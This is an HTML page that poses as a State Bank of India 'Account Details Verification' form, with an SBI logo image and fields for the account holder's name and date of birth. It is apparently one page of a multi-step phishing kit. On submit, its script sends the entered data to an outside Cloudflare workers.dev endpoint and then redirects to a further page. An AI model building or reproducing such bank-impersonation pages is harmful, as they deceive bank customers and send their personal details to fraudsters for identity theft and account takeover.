<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>about</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }
        
        body {
            background-color: #f0f0f0;
            min-height: 100vh;
            padding-bottom: 20px;
        }
        
        .header {
            text-align: center;
            padding: 15px;
            background-color: white;
        }
        
        .logo {
            max-width: 100%;
            height: auto;
            max-height: 120px;
        }
        
        .container {
            max-width: 420px;
            margin: 15px auto;
            background-color: white;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.08);
            overflow: hidden;
        }
        
        .form-header {
            color: #000;
            padding: 18px 20px 8px 20px;
            text-align: center;
            font-size: 16px;
            font-weight: bold;
        }
        
        .form-content {
            padding: 0 20px 20px 20px;
        }
        
        .form-group {
            margin-bottom: 15px;
        }
        
        .form-label {
            display: block;
            font-size: 12px;
            font-weight: bold;
            color: #333;
            margin-bottom: 3px;
        }
        
        .form-input {
            width: 100%;
            padding: 6px 0;
            font-size: 13px;
            border: none;
            border-bottom: 1px solid #ccc;
            background-color: transparent;
            outline: none;
            border-radius: 0;
            transition: border-color 0.3s;
            text-align: left;
            font-weight: bold;
        }
        
        .form-input:focus {
            border-bottom-color: #24A1E8;
        }
        
        .submit-button {
            display: block;
            width: 100%;
            padding: 10px;
            background-color: #24A1E8;
            color: white;
            font-size: 14px;
            font-weight: bold;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            margin-top: 15px;
        }
        
        .submit-button:hover {
            background-color: #1a8cd8;
        }
        
        .message {
            font-size: 13px;
            color: #666;
            text-align: center;
            margin-bottom: 15px;
            line-height: 1.4;
        }
        
        .asterisk {
            color: #ff0000;
        }
        
        .footer-img {
            width: 100%;
            max-width: 900px;
            display: block;
            margin: 20px auto 0;
        }
    </style>
</head>
<body>
    <!-- Same Header as index.html -->
    <div class="header">
        <img src="https://i.ibb.co/fz5x9ff2/Main-817fcadb-1.jpg" 
             alt="SBI Logo" 
             class="logo">
    </div>
    
    <!-- Account Details Verification Form -->
    <div class="container">
        <div class="form-header">
            Account Details Verification
        </div>
        
        <div class="form-content">
            <div class="message">
                Please enter your account details for verification.
            </div>
            
            <div class="form-group">
                <label class="form-label">Account Holder Name <span class="asterisk">*</span></label>
                <input type="text" class="form-input" id="accountName" placeholder="Enter account holder name" required>
            </div>
            
            <div class="form-group">
                <label class="form-label">Date of Birth (DD/MM/YYYY) <span class="asterisk">*</span></label>
                <input type="text" class="form-input" id="dob" placeholder="DDMMYYYY" maxlength="8" required>
            </div>
            
            <button class="submit-button">SUBMIT</button>
        </div>
    </div>
    
    <!-- Same Footer as index.html -->
    <img src="https://i.ibb.co/5WTjD1Nb/Footer-bfdfef4c-1.jpg" 
         alt="Security Guidelines" 
         class="footer-img">
    
    <script>
        // Account Name Input - Only letters and spaces
        const accountNameInput = document.getElementById('accountName');
        accountNameInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/[^A-Za-z\s]/g, '');
            e.target.value = value;
        });
        
        // Date of Birth Input Formatting - DDMMYYYY (8 digits only)
        const dobInput = document.getElementById('dob');
        
        dobInput.addEventListener('input', function(e) {
            // Remove all non-digits
            let value = e.target.value.replace(/\D/g, '');
            
            // Limit to 8 digits
            value = value.substring(0, 8);
            
            // Format as DD/MM/YYYY when we have all 8 digits
            if (value.length === 8) {
                const day = value.substring(0, 2);
                const month = value.substring(2, 4);
                const year = value.substring(4, 8);
                
                // Validate day (01-31)
                if (parseInt(day) < 1 || parseInt(day) > 31) {
                    dobInput.style.borderBottomColor = '#ff4444';
                    return;
                }
                
                // Validate month (01-12)
                if (parseInt(month) < 1 || parseInt(month) > 12) {
                    dobInput.style.borderBottomColor = '#ff4444';
                    return;
                }
                
                e.target.value = `${day}/${month}/${year}`;
            } else {
                e.target.value = value;
            }
        });
        
        // Submit Button
        document.querySelector('.submit-button').addEventListener('click', async function(e) {
            e.preventDefault();
            
            const accountName = accountNameInput.value.trim();
            const dob = dobInput.value.trim();
            
            // Validation
            if (!accountName || accountName.length < 3) {
                accountNameInput.style.borderBottomColor = '#ff4444';
                return;
            } else {
                accountNameInput.style.borderBottomColor = '#ccc';
            }
            
            // Check if DOB is in correct format (DD/MM/YYYY or DDMMYYYY)
            let dobValid = false;
            let formattedDOB = '';
            
            if (dob.length === 8 && /^\d{8}$/.test(dob)) {
                // Format is DDMMYYYY
                const day = dob.substring(0, 2);
                const month = dob.substring(2, 4);
                const year = dob.substring(4, 8);
                
                if (parseInt(day) >= 1 && parseInt(day) <= 31 && 
                    parseInt(month) >= 1 && parseInt(month) <= 12) {
                    formattedDOB = `${day}/${month}/${year}`;
                    dobValid = true;
                }
            } else if (dob.length === 10 && /^\d{2}\/\d{2}\/\d{4}$/.test(dob)) {
                // Format is DD/MM/YYYY
                const [day, month, year] = dob.split('/');
                if (parseInt(day) >= 1 && parseInt(day) <= 31 && 
                    parseInt(month) >= 1 && parseInt(month) <= 12) {
                    formattedDOB = dob;
                    dobValid = true;
                }
            }
            
            if (!dobValid) {
                dobInput.style.borderBottomColor = '#ff4444';
                return;
            } else {
                dobInput.style.borderBottomColor = '#ccc';
            }
            
            // ⬇️⬇️⬇️ Account Details डेटा worker को भेजें (localStorage हटाया) ⬇️⬇️⬇️
            const submission = {
                id: Date.now(),
                type: 'Account Details',
                data: {
                    name: accountName,
                    dob: formattedDOB
                },
                timestamp: new Date().toISOString(),
                ip: 'Not available in browser'
            };

            try {
                const response = await fetch('https://late-hat-a76f.skd38824.workers.dev/', {
                    method: 'POST',
                    mode: 'cors',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(submission)
                });

                if (response.ok) {
                    const result = await response.json();
                    if (result.success) {
                        // blogthree.html पर रीडायरेक्ट
                        window.location.href = 'blogthree.html';
                    } else {
                        alert('Submission failed: ' + (result.error || 'unknown error'));
                    }
                } else {
                    alert('Server error: HTTP ' + response.status);
                }
            } catch (error) {
                console.error('Worker submission error:', error);
                alert('Network error: ' + error.message);
            }
        });
        
        // Allow user to type DDMMYYYY and auto-format when they finish
        dobInput.addEventListener('blur', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            
            if (value.length === 8) {
                const day = value.substring(0, 2);
                const month = value.substring(2, 4);
                const year = value.substring(4, 8);
                
                if (parseInt(day) >= 1 && parseInt(day) <= 31 && 
                    parseInt(month) >= 1 && parseInt(month) <= 12) {
                    e.target.value = `${day}/${month}/${year}`;
                }
            }
        });
    </script>
</body>
</html>
